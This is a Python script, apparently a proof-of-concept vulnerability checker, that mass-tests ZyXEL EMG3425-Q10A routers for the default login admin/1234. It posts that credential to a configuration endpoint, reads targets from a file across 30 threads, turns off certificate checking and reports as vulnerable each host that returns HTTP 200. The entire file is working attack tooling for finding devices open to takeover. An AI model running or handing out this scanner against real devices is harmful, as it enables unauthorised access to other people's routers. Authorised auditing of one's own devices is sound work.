import requests
import argparse
from multiprocessing.dummy import Pool
import urllib3

def main():

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    banner="""
   ________  ____ ___  ________  ________   _______ 
  ╱  ╱  ╱  ╲╱    ╱   ╲╱        ╲╱        ╲_╱       ╲
 ╱         ╱         ╱         ╱        _╱         ╱
╱         ╱        _╱       __╱-        ╱         ╱ 
╲________╱╲____╱___╱╲______╱  ╲________╱╲________╱  
                                                                                               
    """
    print(banner)
    parse = argparse.ArgumentParser(description="众勤通信设备贸易有限公司ZyXEL-EMG3425-Q10A存在弱口令")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    parse.add_argument('-f', '--file', dest='file', type=str, help='请选择批量文件')
    args = parse.parse_args()
    urls = []
    url=args.url
    file=args.file
    if url:
        if "http" not in url:
            url = f"http://{args.url}"
        check(url)
    elif file:
        with open(file, 'r+') as f:
            for i in f:
                domain = i.strip()
                if "http" not in domain:
                    urls.append(f"http://{domain}")
                else:
                    urls.append(domain)
        pool = Pool(30)
        pool.map(check, urls)


def check(domain):
    url=f"{domain}/cgi-bin/luci/expert/configuration"
    headers={
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0'
    }
    data = "language_choice=en&username=admin&password=1234&time_choice=GMT-0"
    try:
        response = requests.post(url=url,headers=headers,data=data,verify=False,timeout=3,allow_redirects=False)
        if response.status_code == 200:
            print(f"[*]存在漏洞:{url}")
        else:
            print("[-]不存在漏洞")
    except Exception as e:
        print("网站出现错误")


if __name__ == '__main__':
    main()